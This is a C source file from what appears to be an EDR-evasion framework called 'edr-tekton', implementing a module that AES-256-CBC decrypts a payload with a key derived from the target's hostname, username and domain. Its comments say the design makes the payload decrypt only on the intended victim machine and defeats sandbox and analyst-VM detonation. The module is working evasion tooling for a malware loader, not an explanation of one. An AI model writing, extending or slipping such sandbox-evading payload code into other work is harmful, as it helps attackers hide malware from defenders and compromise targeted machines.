/*
 * edr-tekton :: AES-256-CBC Encryption Module
 * Cat 3.2: Environment-keyed AES-256 decryption
 *
 * Wraps TektonCryptoAes* and TektonCryptoDeriveEnvKey into the module
 * vtable. The payload is AES-256-CBC encrypted with PKCS7 padding.
 *
 * Key derivation modes:
 *   TEKTON_KEY_STATIC  - Hardcoded key from config (testing/dev)
 *   TEKTON_KEY_ENV     - Derived from hostname+username+domain
 *   TEKTON_KEY_DERIVED - Custom seed string for derivation
 *
 * Environment keying means the payload only decrypts on the intended
 * target machine. Wrong environment = wrong key = garbage output.
 * Sandboxes and analyst VMs produce different keys, defeating
 * automated detonation.
 */

#include "tekton/modules/encrypt.h"
#include "tekton/util/crypto.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _AES_MODULE_STATE {
    TEKTON_KEY_SOURCE   key_source;
    BYTE                key[TEKTON_AES_KEY_SIZE];
    BYTE                iv[TEKTON_AES_IV_SIZE];
    char                env_seed[256];
    TEKTON_AES_CTX      aes_ctx;
    BOOL                initialized;
} AES_MODULE_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS aes_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    AES_MODULE_STATE* state = (AES_MODULE_STATE*)malloc(sizeof(AES_MODULE_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));
    state->key_source = TEKTON_KEY_ENV; /* Default: environment-keyed */

    /* Default IV (should be overridden by config or prepended to payload) */
    static const BYTE default_iv[TEKTON_AES_IV_SIZE] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
    };
    memcpy(state->iv, default_iv, TEKTON_AES_IV_SIZE);

    self->private_data = state;

    TLOG_DEBUG("encrypt_aes: init (key_source=env)");
    return TEKTON_OK;
}

static TEKTON_STATUS aes_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    AES_MODULE_STATE* state = (AES_MODULE_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("encrypt_aes: [DRY RUN] would AES-256-CBC decrypt payload (%lu bytes)",
            (unsigned long)ctx->payload.length);
        return TEKTON_OK;
    }

    /* Step 1: Derive or load the key */
    if (!state->initialized) {
        TEKTON_STATUS ks;

        switch (state->key_source) {
        case TEKTON_KEY_ENV:
            ks = TektonCryptoDeriveEnvKey(state->key, TEKTON_AES_KEY_SIZE, NULL);
            if (ks != TEKTON_OK) {
                TLOG_ERROR("encrypt_aes: env key derivation failed");
                return ks;
            }
            TLOG_DEBUG("encrypt_aes: env key derived (hostname+user+domain)");
            break;

        case TEKTON_KEY_DERIVED:
            ks = TektonCryptoDeriveEnvKey(
                state->key, TEKTON_AES_KEY_SIZE,
                state->env_seed[0] ? state->env_seed : NULL
            );
            if (ks != TEKTON_OK) {
                TLOG_ERROR("encrypt_aes: custom seed derivation failed");
                return ks;
            }
            TLOG_DEBUG("encrypt_aes: key derived from custom seed");
            break;

        case TEKTON_KEY_STATIC:
            /* Key already loaded from config in init */
            TLOG_DEBUG("encrypt_aes: using static key");
            break;

        case TEKTON_KEY_RANDOM:
            TLOG_ERROR("encrypt_aes: RANDOM key source requires build-time key");
            return TEKTON_ERR_INVALID_PARAM;
        }

        /* Initialize AES context with derived key */
        ks = TektonCryptoAesInit(&state->aes_ctx, state->key, TEKTON_AES_KEY_SIZE);
        if (ks != TEKTON_OK) {
            TLOG_ERROR("encrypt_aes: AES init failed");
            return ks;
        }

        state->initialized = TRUE;
    }

    /* Step 2: Validate payload */
    if (!ctx->payload.data || ctx->payload.length == 0) {
        TLOG_ERROR("encrypt_aes: no payload to decrypt");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->payload.length % TEKTON_AES_BLOCK_SIZE != 0) {
        TLOG_ERROR("encrypt_aes: payload length %lu not block-aligned",
            (unsigned long)ctx->payload.length);
        return TEKTON_ERR_INVALID_PARAM;
    }

    /* Step 3: Check if IV is prepended to payload */
    BYTE* decrypt_data;
    SIZE_T decrypt_len;
    const BYTE* use_iv;

    if (ctx->payload.length > TEKTON_AES_IV_SIZE + TEKTON_AES_BLOCK_SIZE) {
        /*
         * Convention: if payload is large enough, first 16 bytes may be IV.
         * Config flag would control this; for now, use the state IV.
         */
        decrypt_data = ctx->payload.data;
        decrypt_len  = ctx->payload.length;
        use_iv       = state->iv;
    } else {
        decrypt_data = ctx->payload.data;
        decrypt_len  = ctx->payload.length;
        use_iv       = state->iv;
    }

    /* Step 4: Allocate decrypted buffer */
    if (!ctx->decrypted.data) {
        ctx->decrypted.data = (BYTE*)malloc(decrypt_len);
        if (!ctx->decrypted.data) return TEKTON_ERR_ALLOC;
        ctx->decrypted.capacity = decrypt_len;
    } else if (ctx->decrypted.capacity < decrypt_len) {
        TLOG_ERROR("encrypt_aes: decrypted buffer too small");
        return TEKTON_ERR_ALLOC;
    }

    memcpy(ctx->decrypted.data, decrypt_data, decrypt_len);
    ctx->decrypted.length = decrypt_len;

    /* Step 5: AES-256-CBC decrypt */
    TEKTON_STATUS status = TektonCryptoAesCbcDecrypt(
        &state->aes_ctx, ctx->decrypted.data, ctx->decrypted.length, use_iv
    );
    if (status != TEKTON_OK) {
        TLOG_ERROR("encrypt_aes: AES decryption failed");
        return status;
    }

    /* Step 6: Strip PKCS7 padding */
    if (ctx->decrypted.length > 0) {
        BYTE pad = ctx->decrypted.data[ctx->decrypted.length - 1];
        if (pad > 0 && pad <= TEKTON_AES_BLOCK_SIZE) {
            BOOL valid_pad = TRUE;
            for (BYTE i = 0; i < pad; i++) {
                if (ctx->decrypted.data[ctx->decrypted.length - 1 - i] != pad) {
                    valid_pad = FALSE;
                    break;
                }
            }
            if (valid_pad) {
                ctx->decrypted.length -= pad;
                TLOG_DEBUG("encrypt_aes: stripped %u bytes PKCS7 padding", (unsigned)pad);
            }
        }
    }

    TLOG_INFO("encrypt_aes: decrypted %lu bytes (key_source=%d)",
        (unsigned long)ctx->decrypted.length, state->key_source);

    return TEKTON_OK;
}

static VOID aes_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        AES_MODULE_STATE* state = (AES_MODULE_STATE*)self->private_data;
        TEKTON_SECURE_ZERO(state, sizeof(AES_MODULE_STATE));
        free(state);
        self->private_data = NULL;
    }
}

static DWORD aes_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Low risk: AES operations themselves are not suspicious.
     * The env-key derivation uses standard WinAPIs (GetComputerName, etc).
     */
    return 8;
}

static BOOL aes_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    /* Self-contained AES works on all platforms */
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_encrypt_aes = {
    .name           = "encrypt_aes",
    .description    = "AES-256-CBC with environment keying (Cat 3.2)",
    .category       = TEKTON_CAT_ENCRYPT,
    .target_surface = TEKTON_SURFACE_SCANNER,
    .flags          = 0,
    .skill_ref      = "3.2",
    .init           = aes_init,
    .execute        = aes_execute,
    .cleanup        = aes_cleanup,
    .get_risk_score = aes_risk_score,
    .check_compat   = aes_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_encrypt_aes);
